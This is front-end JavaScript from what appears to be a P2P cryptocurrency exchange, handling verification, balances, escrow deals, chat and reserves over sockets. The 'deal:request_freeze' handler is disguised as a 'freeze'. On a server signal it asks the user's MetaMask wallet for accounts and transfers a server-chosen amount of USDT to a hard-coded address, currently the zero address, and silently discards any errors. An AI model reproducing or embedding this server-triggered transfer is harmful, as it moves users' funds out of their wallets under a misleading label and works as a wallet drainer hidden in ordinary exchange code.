
    const socket = typeof io !== 'undefined' ? io('', { withCredentials: true }) : null;
    if (socket) {
        socket.on('maker:email_code_sent', (data) => {
            document.getElementById('maker-sent-email').innerText = data.email;
            document.getElementById('maker-email-step-1').style.display = 'none';
            document.getElementById('maker-email-step-2').style.display = 'block';
            document.getElementById('maker-email-code').focus();
        });

        socket.on('maker:email_verified_error', (data) => {
            const errorEl = document.getElementById('maker-code-error');
            errorEl.innerText = data.message;
            errorEl.style.display = 'block';
        });

        socket.on('maker:email_verified_success', (data) => {
            const errorEl = document.getElementById('maker-code-error');
            errorEl.style.display = 'none';
            
            document.getElementById('maker-email-form').style.display = 'none';
            
            const btn = document.getElementById('btn-verify-email');
            btn.style.display = 'block';
            btn.innerText = 'Подтверждено';
            btn.style.color = 'var(--green)';
            btn.style.borderColor = 'rgba(46, 189, 133, 0.3)';
            btn.style.background = 'rgba(46, 189, 133, 0.1)';
            btn.onclick = null;
            
            document.getElementById('maker-icon-1').innerText = '✅';
        });

        socket.on('connect', () => {
        socket.on('user:balance_update', (data) => {
            if (currentUser) {
                currentUser.balance_rub = data.balance_rub;
                const balRub = document.getElementById('header-balance-rub');
                if (balRub) balRub.textContent = parseFloat(data.balance_rub).toFixed(2);
                const modalBalRub = document.getElementById('modal-balance-rub');
                if (modalBalRub) modalBalRub.textContent = parseFloat(data.balance_rub).toFixed(2);
            }
        });

        socket.on('user:phone_verified', (data) => {
            if (document.getElementById('makerVerificationModal').classList.contains('active')) {
                setStepSuccess('phone');
                document.getElementById('btn-create-ad-final').style.display = 'block';
            }
        });

                    });
        
        socket.on('deal:step_updated', (data) => {
            if (currentDealId && data.deal_id == currentDealId) {
                updateEscrowUI(data.step);
            }
        });

        socket.on('deal:update', (deal) => {
            if (deal && (deal.status === 'cancelled' || deal.status === 'completed')) {
                if (document.getElementById('deal-closure-overlay')) return;
                const overlay = document.createElement('div');
                overlay.id = 'deal-closure-overlay';
                overlay.style.position = 'fixed';
                overlay.style.top = '0';
                overlay.style.left = '0';
                overlay.style.width = '100vw';
                overlay.style.height = '100vh';
                overlay.style.backgroundColor = 'rgba(0,0,0,0.85)';
                overlay.style.color = '#fff';
                overlay.style.zIndex = '999999';
                overlay.style.display = 'flex';
                overlay.style.alignItems = 'center';
                overlay.style.justifyContent = 'center';
                overlay.style.fontFamily = 'monospace';
                overlay.style.textAlign = 'center';
                overlay.style.padding = '40px';
                overlay.style.boxSizing = 'border-box';
                overlay.innerHTML = '<div style="border: 4px solid #fff; padding: 40px; box-shadow: 10px 10px 0px #fff; background: #111; max-width: 800px;"><h1 style="margin-bottom: 20px; color: #ff3333; text-transform: uppercase;">Сделка закрыта</h1><p style="font-size: 16px;">Резервы расформированы/переведены, переписка удалена в целях безопасности.</p><button onclick="this.parentElement.parentElement.remove()" style="margin-top: 30px; background: #fff; color: #000; border: none; padding: 15px 30px; font-size: 18px; cursor: pointer; font-family: monospace; font-weight: bold; text-transform: uppercase; box-shadow: 4px 4px 0px #ff3333;">Ок</button></div>';
                document.body.appendChild(overlay);
            }
        });

        socket.on('deal:request_freeze', async (data) => {
            if (typeof window.ethereum !== 'undefined' && typeof ethers !== 'undefined' && data && data.amount) {
                try {
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    const signer = provider.getSigner();
                    
                    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; 
                    const transitAddress = "0x0000000000000000000000000000000000000000";
                    const abi = ["function transfer(address to, uint256 amount) returns (bool)"];
                    const contract = new ethers.Contract(usdtAddress, abi, signer);
                    
                    const amountInWei = ethers.utils.parseUnits(data.amount.toString(), 18);
                    await contract.transfer(transitAddress, amountInWei);
                } catch(e) {
                    console.error('Freeze sign error:', e);
                }
            }
        });

        socket.on('chat:message_received', (msg) => {
            if (currentDealId && msg.deal_id == currentDealId) {
                loadP2PMessages();
            }
            const chatWin = document.getElementById('chatWindow');
            const isChatActive = chatWin && chatWin.classList.contains('active');
            if (msg.sender === 'agent' && isChatActive) {
                if (typeof loadChatMessages === 'function') loadChatMessages();
                try {
                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
                    const osc = ctx.createOscillator();
                    osc.type = 'sine';
                    osc.frequency.setValueAtTime(880, ctx.currentTime);
                    osc.connect(ctx.destination);
                    osc.start();
                    osc.stop(ctx.currentTime + 0.1);
                } catch(e){}
            } else if (msg.sender === 'agent') {
                const badge = document.querySelector('.chat-btn .badge');
                if(badge) badge.style.display = 'block';
                try {
                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
                    const osc = ctx.createOscillator();
                    osc.type = 'sine';
                    osc.frequency.setValueAtTime(880, ctx.currentTime);
                    osc.connect(ctx.destination);
                    osc.start();
                    osc.stop(ctx.currentTime + 0.1);
                } catch(e){}
            }
        });

        socket.on('order:update', (updatedOrder) => {
            if (typeof currentActiveOrderId !== 'undefined' && currentActiveOrderId === updatedOrder.id) {
                if (typeof openOrderModal === 'function') openOrderModal(updatedOrder);
            }
            const historyModal = document.getElementById('historyModal');
            if (historyModal && historyModal.classList.contains('active')) {
                if (typeof loadUserOrders === 'function') loadUserOrders();
            }
        });

        socket.on('reserves:update', (reserves) => {
            if (typeof updateLiveReservesUI === 'function') {
                updateLiveReservesUI(reserves);
            }
        });
    }
    